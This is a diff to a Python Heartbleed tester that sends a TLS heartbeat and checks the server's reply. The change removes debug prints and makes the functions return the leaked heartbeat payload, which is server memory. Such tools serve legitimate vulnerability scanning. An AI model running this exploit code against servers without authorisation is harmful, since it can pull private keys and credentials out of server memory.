@@ -25,6 +25,9 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 ''')
 
 ### https://tools.ietf.org/html/rfc6520
+### https://github.com/openssl/openssl/commit/96db9023b881d7cd9f379b0c154650d6c108e9a3#diff-2
+### A 0-lenth for the payload should cause the HeartBeat message to drop on patched servers
+
 hb = struct.pack(">BHHBH",
   24,  # TLS package kind - 24 == Heartbeat
   770, # TLS Version (1.1) (mod 1.2)
@@ -43,7 +46,6 @@ def recvall(s, length, timeout=2):
       return None
     r, w, e = select.select([s], [], [], 2)
     if s in r:
-      print "reading %d bytes" % remain
       data = s.recv(remain)
       if not data:
         return None
@@ -54,31 +56,21 @@ def recvall(s, length, timeout=2):
 def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None or len(hdr) < 5:
-      print 'Unexpected EOF receiving record header - server closed connection'
       return None, None, None
     typ, ver, ln = struct.unpack('>BHH', hdr)
-    print "Server length: %s" % (ln)
     pay = recvall(s, ln, 10)
     if pay is None:
-      print 'Unexpected EOF receiving record payload - server closed connection'
       return None, None, None
-    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
     return typ, ver, pay
 
 def open_connection(host, port):
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print 'Connecting...'
-    #sys.stdout.flush()
     conn.connect((host, port))
-    print 'Sending Client Hello...'
-    #sys.stdout.flush()
     conn.send(hello)
-    print 'Waiting for Server Hello...'
-    #sys.stdout.flush()
     while True:
         message_type, version, payload = recvmsg(conn)
         if message_type == None:
-            return (0, 'Server closed connection without sending Server Hello.')
+            return (0, 'Server closed connection without sending Server Hello.', None)
         # Look for server hello done message.
         if message_type == 22 and ord(payload[0]) == 0x0E:
             break
@@ -97,11 +89,9 @@ def test_heartbleed(conn):
   """
   message_type, version, payload = recvmsg(conn)
   if message_type is None:
-    return (1, 'No heartbeat response received, server likely not vulnerable.')
+    return (1, 'No heartbeat response received, server likely not vulnerable.', None)
 
   if message_type == 24:
-    print message_type, version, len(payload)
     if len(payload) > 3:
-      print len(payload), payload.encode("hex")
-      return (0, "Server is vulnerable.")
-  return (1, "Server returned error, likely not vulnerable.")
+      return (0, "Server is vulnerable.", payload)
+  return (1, "Server returned error, likely not vulnerable.", payload)
